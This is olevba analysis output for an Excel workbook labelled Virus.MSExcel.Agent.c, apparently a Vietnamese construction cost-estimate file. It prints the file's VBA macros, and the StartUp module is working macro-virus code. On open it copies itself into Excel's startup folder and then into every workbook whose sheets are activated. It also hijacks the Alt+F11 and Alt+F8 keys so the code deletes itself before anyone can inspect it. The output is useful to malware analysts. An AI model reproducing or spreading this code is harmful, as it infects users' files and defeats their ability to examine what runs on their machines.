olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function WritePrivateProfileString Lib "Kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationname As String, ByVal lpKeyName As Any, ByVal lsString As Any, ByVal lplFilename As String) As Long
Private Declare Function GetPrivateProfileInt Lib "Kernel32" Alias "GetPriviteProfileIntA" (ByVal lpApplicationname As String, ByVal lpKeyName As String, ByVal nDefault As Long, ByVal lpFileName As String) As Long
Private Declare Function GetPrivateProfileString Lib "Kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationname As String, ByVal lpKeyName As String, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Private Declare Function GetWindowsDirectory Lib "Kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function GetSystemDirectory Lib "Kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function Dbf_CloseAll Lib "DBF1" () As Long
Private Declare Function Dbf_OpenAsHandle Lib "DBF1" (ByVal FileN As String, ByVal Mode As Integer, ByVal DbfType As Integer, ByVal HandleF As Integer) As Integer
Private Declare Function Dbf_Close Lib "DBF1" (ByVal Hl As Integer) As Integer

Dim WinPath As String
Dim WinSysPath As String
Const MAX_PATH = 260

Function Getini(lpAppName As String, lpKeyName As String, lpDefault As String, lpFileName As String) As String
Dim ret As Long
Dim Temp As String * 256
Dim Temp1 As String
    Dim rtn As Long
    Dim buffer As String
    Dim i As Integer

buffer = Space(MAX_PATH)

rtn = GetSystemDirectory(buffer, Len(buffer))   'get the path
WinSysPath = Left(buffer, rtn)                                  'parse the path into the global string
rtn = GetWindowsDirectory(buffer, Len(buffer))
WinPath = Left(buffer, rtn)

lpDefault = ""
lpFileName = WinPath & "\dtacitt.ini"

ret = GetPrivateProfileString(lpAppName, lpKeyName, lpDefault, Temp, Len(Temp), lpFileName)

If ret = 0 Then
    Getini = ""
Else
    Temp1 = ""
    For i = 1 To Len(Trim(Temp))
        If Asc(Mid(Trim(Temp), i, 1)) <> 0 Then
        Temp1 = Temp1 & Mid(Trim(Temp), i, 1)
        End If
    Next
    Getini = Temp1
End If
End Function

Function Writeini(lpAppName As String, lpKeyName As String, lpString As String, lpFileName As String) As Integer
Dim ret As Long
    Dim rtn As Long
    Dim buffer As String

buffer = Space(MAX_PATH)

rtn = GetSystemDirectory(buffer, Len(buffer))   'get the path
WinSysPath = Left(buffer, rtn)                                  'parse the path into the global string
rtn = GetWindowsDirectory(buffer, Len(buffer))
WinPath = Left(buffer, rtn)

lpFileName = WinPath & "\dtacitt.ini"
ret = WritePrivateProfileString(lpAppName, lpKeyName, lpString, lpFileName)

If ret = 0 Then
End If
End Function
Private Sub Workbook_SheetActivate(ByVal Sh As Object)
bang = ExecuteExcel4Macro("GET.NOTE(""R1C1"")")

If bang = "Du toan" And Getini("DUTOAN", "DTinfRUN", "", "") = "2" Then
Application.ScreenUpdating = False
Application.Run Macro:="dt972000.xla!nap_DBF"
ret = Writeini("DUTOAN", "DTinfRUN", "0", "")
Sheets("Du toan").Select
Application.ScreenUpdating = True
End If

End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet7.cls 
in file: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet8.cls 
in file: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet9.cls 
in file: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet10.cls 
in file: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet10'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet11.cls 
in file: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet12.cls 
in file: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet13.cls 
in file: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet13'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet14.cls 
in file: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet15.cls 
in file: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet15'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet16.cls 
in file: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet16'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet17.cls 
in file: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet17'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet18.cls 
in file: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet18'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: Virus.MSExcel.Agent.c-3c0bf25d5ecc584da5acf6f55f142f4d259b6da4 - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    'Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub ycop()
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub

Sub escape()
    On Error Resume Next
    Application.OnSheetActivate = "StartUp.xls!back"
    Application.OnKey "%{F11}"
    Application.OnKey "%{F8}"
    Application.SendKeys "%{F11}"
    Application.SendKeys "%{F8}"
    For Each book In Workbooks
        Application.DisplayAlerts = False
        If book <> "StartUp.xls" Then book.Sheets("StartUp").Delete
    Next
    For Each book In Workbooks
        If book.Name = "StartUp.xls" Then
        book.Close
    End If
    Next
End Sub

Sub back()
  On Error Resume Next
  Application.OnKey "%{F8}", "StartUp.xls!escape"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!ycop"
  Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartU
' 0085     25 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tong hop kinh ph
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Du toa
' 0085     25 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Chenh lech vat t
' 0085     24 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Phan tich vat t
' 0085     23 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tong hop vat t
' 0085     22 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Gia tri vat t
' 0085     26 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Chi phi van chuye
' 0085     26 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Gia giao VL den H
' 0085     21 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Gia VL den H
' 0085     24 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Don gia chi tie
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Du tha
' 0085     23 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tu van Thiet k
' 0085     24 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tong hop DTXD C
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Du toan XDC
' 0085     21 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tong hop CPX
' 0085     21 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tong hop CPT
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tong hop CP
' 0085     24 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tien do thi con
' 0085     19 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Bia du toa
' 0085     16 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden -  Tro giu
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Confi
' 0018     26 LABEL : Cell Value, String Constant - COTTUVAN len=3 ptgInt 3 
' 0018     23 LABEL : Cell Value, String Constant - DIALOG len=2 ptgBool FALSE 
' 0018     32 LABEL : Cell Value, String Constant - DONGTIEUDEBANG len=3 ptgInt 40 
' 0018     27 LABEL : Cell Value, String Constant - DONGTUVAN len=3 ptgInt 51 
' 0018     74 LABEL : Cell Value, String Constant - Dutoan2001 len=7 ptgRef3d  Tong hop kinh ph!A1 
' 0018     21 LABEL : Cell Value, String Constant - Gia len=3 ptgInt 500 
' 0018     31 LABEL : Cell Value, String Constant - GIATB len=11 ptgArea3d  *INCOMPLETE FORMULA PARSING* Remaining, unparsed expression: b'\x03\x00\x00\x00\xff\xff\x01\x00\x06\x00'
' 0018     26 LABEL : Cell Value, String Constant - GIATRITB len=3 ptgInt 400 
' 0018     29 LABEL : Cell Value, String Constant - GIATRITUVAN len=3 ptgInt 550 
' 0018     26 LABEL : Cell Value, String Constant - GIATRIXL len=3 ptgInt 550 
' 0018     28 LABEL : Cell Value, String Constant - GIATRIXLTB len=3 ptgInt 950 
' 0018     21 LABEL : Cell Value, String Constant - Gib len=3 ptgInt 1000 
' 0018     31 LABEL : Cell Value, String Constant - NHOMCONGTRINH len=3 ptgInt 1 
' 0018     27 LABEL : Cell Value, String Constant - Nia len=9 ptgNum FLOAT 0.015400 
' 0018     27 LABEL : Cell Value, String Constant - Nib len=9 ptgNum FLOAT 0.010500 
' 0018     27 LABEL : Cell Value, String Constant - built-in-name 6 ? len=11 ptgArea3d  *INCOMPLETE FORMULA PARSING* Remaining, unparsed expression: b'\x02\x00\x00\x00!\x00\x00\x00\x10\x00'
' 0018     27 LABEL : Cell Value, String Constant - built-in-name 6 ? len=11 ptgArea3d  *INCOMPLETE FORMULA PARSING* Remaining, unparsed expression: b'\x0f\x00\x00\x00\x1b\x00\x00\x00\x05\x00'
' 0018     42 LABEL : Cell Value, String Constant - built-in-name 7 ? len=26 ptgMemFunc  *INCOMPLETE FORMULA PARSING* Remaining, unparsed expression: b'\x17\x00;\x03\x00\x00\x00\xff\xff\x08\x00\x08\x00;\x03\x00\x04\x00\x05\x00\x00\x00\xff\x00\x10'
' 0018     42 LABEL : Cell Value, String Constant - built-in-name 7 ? len=26 ptgMemFunc  *INCOMPLETE FORMULA PARSING* Remaining, unparsed expression: b'\x17\x00;\x04\x00\x00\x00\xff\xff\x0f\x00\x0f\x00;\x04\x00\x04\x00\x05\x00\x00\x00\xff\x00\x10'
' 0018     42 LABEL : Cell Value, String Constant - built-in-name 7 ? len=26 ptgMemFunc  *INCOMPLETE FORMULA PARSING* Remaining, unparsed expression: b'\x17\x00;\x05\x00\x00\x00\xff\xff\t\x00\t\x00;\x05\x00\x04\x00\x04\x00\x00\x00\xff\x00\x10'
' 0018     27 LABEL : Cell Value, String Constant - built-in-name 7 ? len=11 ptgArea3d  *INCOMPLETE FORMULA PARSING* Remaining, unparsed expression: b'\x06\x00\x04\x00\x05\x00\x00\x00\xff\x00'
' 0018     42 LABEL : Cell Value, String Constant - built-in-name 7 ? len=26 ptgMemFunc  *INCOMPLETE FORMULA PARSING* Remaining, unparsed expression: b'\x17\x00;\x00\x00\x00\x00\xff\xff\x0e\x00\x0e\x00;\x00\x00\x04\x00\x05\x00\x00\x00\xff\x00\x10'
' 0018     42 LABEL : Cell Value, String Constant - built-in-name 7 ? len=26 ptgMemFunc  *INCOMPLETE FORMULA PARSING* Remaining, unparsed expression: b'\x17\x00;\x07\x00\x00\x00\xff\xff\x06\x00\x06\x00;\x07\x00\x04\x00\x04\x00\x00\x00\xff\x00\x10'
' 0018     42 LABEL : Cell Value, String Constant - built-in-name 7 ? len=26 ptgMemFunc  *INCOMPLETE FORMULA PARSING* Remaining, unparsed expression: b'\x17\x00;\x08\x00\x00\x00\xff\xff\x08\x00\x08\x00;\x08\x00\x04\x00\x05\x00\x00\x00\xff\x00\x10'
' 0018     42 LABEL : Cell Value, String Constant - built-in-name 7 ? len=26 ptgMemFunc  *INCOMPLETE FORMULA PARSING* Remaining, unparsed expression: b'\x17\x00;\t\x00\x00\x00\xff\xff\x04\x00\x04\x00;\t\x00\x04\x00\x04\x00\x00\x00\xff\x00\x10'
' 0018     27 LABEL : Cell Value, String Constant - built-in-name 8 ? len=11 ptgArea3d  *INCOMPLETE FORMULA PARSING* Remaining, unparsed expression: b'\x01\x00\x00\x00\xff\xff\x00\x00\x00\x00'
' 0018     49 LABEL : Cell Value, String Constant - Tenchiphi len=25 ptgStr "ThÈm ®Þnh tæng dù to¸n" 
' 002a      2 PRINTHEADERS : Print Row/Column Labels
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 002a      2 PRINTHEADERS : Print Row/Column Labels
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
